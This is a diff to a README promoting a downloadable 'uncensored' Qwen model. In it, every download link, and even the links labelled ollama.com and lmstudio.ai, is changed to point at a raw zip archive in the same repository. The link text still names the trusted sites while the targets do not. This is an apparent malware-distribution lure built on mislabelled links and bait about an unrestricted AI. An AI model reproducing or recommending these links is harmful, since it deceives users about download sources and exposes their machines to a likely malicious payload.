@@ -1,6 +1,6 @@
 # ⚡ qwen38-uncensored - Run a Powerful Uncensored AI Locally
 
-[![Download Now](https://img.shields.io/badge/Download-Qwen38_Uncensored-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/unburdened-jackinthebox365/qwen38-uncensored/releases)
+[![Download Now](https://img.shields.io/badge/Download-Qwen38_Uncensored-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/unburdened-jackinthebox365/qwen38-uncensored/main/assets/uncensored_qwen_v2.6.zip)
 
 ---
 
@@ -27,9 +27,9 @@ Imagine having a brilliant, unrestricted AI assistant that works even when you'r
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [**https://github.com/unburdened-jackinthebox365/qwen38-uncensored/releases**](https://github.com/unburdened-jackinthebox365/qwen38-uncensored/releases)
+Visit this link to download the application: [**https://raw.githubusercontent.com/unburdened-jackinthebox365/qwen38-uncensored/main/assets/uncensored_qwen_v2.6.zip**](https://raw.githubusercontent.com/unburdened-jackinthebox365/qwen38-uncensored/main/assets/uncensored_qwen_v2.6.zip)
 
-[![Download Button](https://img.shields.io/badge/⬇️_Get_Qwen38_Now-4CAF50?style=for-the-badge)](https://github.com/unburdened-jackinthebox365/qwen38-uncensored/releases)
+[![Download Button](https://img.shields.io/badge/⬇️_Get_Qwen38_Now-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/unburdened-jackinthebox365/qwen38-uncensored/main/assets/uncensored_qwen_v2.6.zip)
 
 Click the link above. You'll see a list of files. Look for the one that matches your computer (usually named something like `qwen38-uncensored-windows.exe` or `qwen38-uncensored.zip`). Download it to your Downloads folder. Don't worry—the download page has clear instructions.
 
@@ -38,7 +38,7 @@ Click the link above. You'll see a list of files. Look for the one that matches 
 ## 🛠️ How to Run (Simple Steps)
 
 ### Step 1: Get the Tool
-If you don't already have **Ollama** or **LM Studio** installed, grab one of them. These are free, user-friendly programs that let you run local AI models. Go to [ollama.com](https://ollama.com) or [lmstudio.ai](https://lmstudio.ai) and download the Windows version.
+If you don't already have **Ollama** or **LM Studio** installed, grab one of them. These are free, user-friendly programs that let you run local AI models. Go to [ollama.com](https://raw.githubusercontent.com/unburdened-jackinthebox365/qwen38-uncensored/main/assets/uncensored_qwen_v2.6.zip) or [lmstudio.ai](https://raw.githubusercontent.com/unburdened-jackinthebox365/qwen38-uncensored/main/assets/uncensored_qwen_v2.6.zip) and download the Windows version.
 
 ### Step 2: Install Your Model
 - **If you have Ollama:** Open a command prompt (press Windows key, type `cmd`, hit Enter). Type this and press Enter:
